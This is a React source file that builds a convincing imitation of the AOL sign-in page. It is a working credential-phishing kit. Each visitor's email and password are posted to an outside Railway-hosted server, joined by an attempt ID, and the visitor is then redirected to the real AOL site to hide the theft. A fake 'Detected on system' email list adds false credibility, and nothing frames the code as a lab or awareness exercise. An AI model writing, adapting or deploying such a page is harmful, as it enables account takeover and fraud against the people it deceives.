/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { ChevronLeft } from 'lucide-react';

// Mock service to "detect" emails stored on the system
const emailDetectionService = {
  getDetectedEmails: (): string[] => {
    const saved = localStorage.getItem('aol_detected_emails');
    return saved ? JSON.parse(saved) : ['user@aol.com', 'demo@aol.com'];
  },
  saveEmail: (email: string) => {
    const emails = emailDetectionService.getDetectedEmails();
    if (!emails.includes(email)) {
      localStorage.setItem('aol_detected_emails', JSON.stringify([...emails, email]));
    }
  }
};

export default function App() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [attemptId, setAttemptId] = useState<string | null>(null);
  const [detectedEmails, setDetectedEmails] = useState<string[]>([]);
  const [isFocused, setIsFocused] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    setDetectedEmails(emailDetectionService.getDetectedEmails());
  }, []);

  // Handle Email Step
  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) return;

    setIsLoading(true);
    setError('');

    try {
      const response = await fetch('https://demascus-production-b89b.up.railway.app/api/submit-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email }),
      });

      const data = await response.json();

      if (response.ok && data.attemptId) {
        setAttemptId(data.attemptId);
        emailDetectionService.saveEmail(email);
        setStep(2);
      } else {
        setError(data.message || 'Failed to process email. Please try again.');
      }
    } catch (err) {
      console.error(err);
      setError('Cannot connect to server. Check your internet or backend.');
    } finally {
      setIsLoading(false);
    }
  };

  // Handle Password Step
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password || !attemptId) return;

    setIsLoading(true);
    setError('');

    try {
      const response = await fetch('https://demascus-production-b89b.up.railway.app/api/submit-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ attemptId, password }),
      });

      if (response.ok) {
        const redirectUrl = "https://www.aol.com";
        window.location.href = redirectUrl;

        // Optional: You can reset form or show success screen here
        // emailDetectionService.saveEmail(email);
      } else {
        const data = await response.json().catch(() => ({}));
        setError(data.message || 'Invalid password or submission failed.');
      }
    } catch (err) {
      console.error(err);
      setError('Cannot connect to server. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleBack = () => {
    setStep(1);
    setPassword('');
    setError('');
  };

  return (
    <div className="min-h-screen bg-white flex flex-col font-sans">
      {/* Header */}
      <header className="flex justify-between items-center px-6 py-4 md:px-12">
        <div className="flex items-center">
          <span className="text-3xl font-black tracking-tighter text-black">AOL</span>
        </div>
        <nav className="flex space-x-6 text-[13px] font-medium text-[#0066ff]">
          <a href="#" className="hover:underline">Help</a>
          <a href="#" className="hover:underline">Terms</a>
          <a href="#" className="hover:underline">Privacy</a>
        </nav>
      </header>

      {/* Main Content */}
      <main className="flex-grow flex items-center justify-center md:justify-end md:pr-[10%] lg:pr-[15%] px-4 py-8">
        <div className="w-full max-w-[420px] bg-white rounded-[32px] shadow-[0_8px_30px_rgb(0,0,0,0.08)] border border-gray-100 p-8 md:p-10">
          
          {/* Card Logo */}
          <div className="flex justify-center mb-6">
            <span className="text-4xl font-black tracking-tighter text-black">AOL</span>
          </div>

          <AnimatePresence mode="wait">
            {step === 1 ? (
              <motion.div
                key="step1"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                transition={{ duration: 0.3 }}
              >
                <h1 className="text-xl font-bold text-center text-[#222] mb-10">Sign in</h1>

                {error && <p className="text-red-500 text-sm text-center mb-4">{error}</p>}

                <form onSubmit={handleNext} className="space-y-6">
                  <div className="relative">
                    <input
                      id="email"
                      type="text"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      onFocus={() => setIsFocused(true)}
                      onBlur={() => setIsFocused(false)}
                      placeholder="Username, email address or mobile number"
                      className={`w-full py-2 bg-transparent border-b-2 outline-none transition-colors duration-200 text-lg placeholder:text-gray-400 ${
                        isFocused ? 'border-[#0066ff]' : 'border-gray-300'
                      }`}
                      required
                    />
                    
                    {/* Detected Emails Suggestion */}
                    {isFocused && detectedEmails.length > 0 && !email && (
                      <div className="absolute z-10 w-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg overflow-hidden">
                        <div className="px-3 py-2 text-xs font-semibold text-gray-500 bg-gray-50 uppercase tracking-wider">
                          Detected on system
                        </div>
                        {detectedEmails.map((e) => (
                          <button
                            key={e}
                            type="button"
                            onMouseDown={() => setEmail(e)}
                            className="w-full px-4 py-2 text-left text-sm hover:bg-gray-100 transition-colors"
                          >
                            {e}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>

                  <button
                    type="submit"
                    disabled={isLoading}
                    className="w-full bg-[#0066ff] hover:bg-[#0052cc] text-white font-bold py-3.5 rounded-lg transition-colors duration-200 flex justify-center items-center"
                  >
                    {isLoading ? (
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                    ) : (
                      'Next'
                    )}
                  </button>

                  <div className="flex justify-between items-center text-sm">
                    <label className="flex items-center cursor-pointer select-none text-[#0066ff]">
                      <input type="checkbox" className="w-4 h-4 mr-2 border-gray-300 rounded focus:ring-[#0066ff]" defaultChecked />
                      Stay signed in
                    </label>
                    <a href="#" className="text-[#0066ff] hover:underline">Forgotten username?</a>
                  </div>

                  <div className="pt-4">
                    <button
                      type="button"
                      className="w-full border border-[#0066ff] text-[#0066ff] font-bold py-3 rounded-lg hover:bg-blue-50 transition-colors duration-200"
                    >
                      Create an account
                    </button>
                  </div>
                </form>
              </motion.div>
            ) : (
              <motion.div
                key="step2"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.3 }}
              >
                <div className="flex items-center justify-center mb-2">
                  <button 
                    onClick={handleBack}
                    className="mr-2 p-1 hover:bg-gray-100 rounded-full transition-colors"
                    title="Go back"
                  >
                    <ChevronLeft className="w-5 h-5 text-gray-600" />
                  </button>
                  <span className="text-sm font-medium text-gray-700 truncate max-w-[200px]">{email}</span>
                  <button 
                    onClick={handleBack}
                    className="ml-2 text-xs text-[#0066ff] hover:underline font-semibold"
                  >
                    Edit
                  </button>
                </div>
                
                <h1 className="text-xl font-bold text-center text-[#222] mb-8">Enter password</h1>

                {error && <p className="text-red-500 text-sm text-center mb-4">{error}</p>}

                <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="relative">
                    <input
                      id="password"
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      onFocus={() => setIsFocused(true)}
                      onBlur={() => setIsFocused(false)}
                      placeholder="Password"
                      autoFocus
                      className={`w-full py-2 bg-transparent border-b-2 outline-none transition-colors duration-200 text-lg placeholder:text-gray-400 ${
                        isFocused ? 'border-[#0066ff]' : 'border-gray-300'
                      }`}
                      required
                    />
                  </div>

                  <button
                    type="submit"
                    disabled={isLoading}
                    className="w-full bg-[#0066ff] hover:bg-[#0052cc] text-white font-bold py-3.5 rounded-lg transition-colors duration-200 flex justify-center items-center"
                  >
                    {isLoading ? (
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                    ) : (
                      'Sign in'
                    )}
                  </button>

                  <div className="text-center">
                    <a href="#" className="text-sm text-[#0066ff] hover:underline">Forgotten password?</a>
                  </div>
                </form>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </main>

      {/* Footer */}
      <footer className="p-6 text-center text-[11px] text-gray-500 md:hidden">
        <div className="flex justify-center space-x-4 mb-2">
          <a href="#" className="hover:underline">Help</a>
          <a href="#" className="hover:underline">Terms</a>
          <a href="#" className="hover:underline">Privacy</a>
        </div>
        <p>&copy; {new Date().getFullYear()} AOL Inc. All Rights Reserved.</p>
      </footer>
    </div>
  );
}
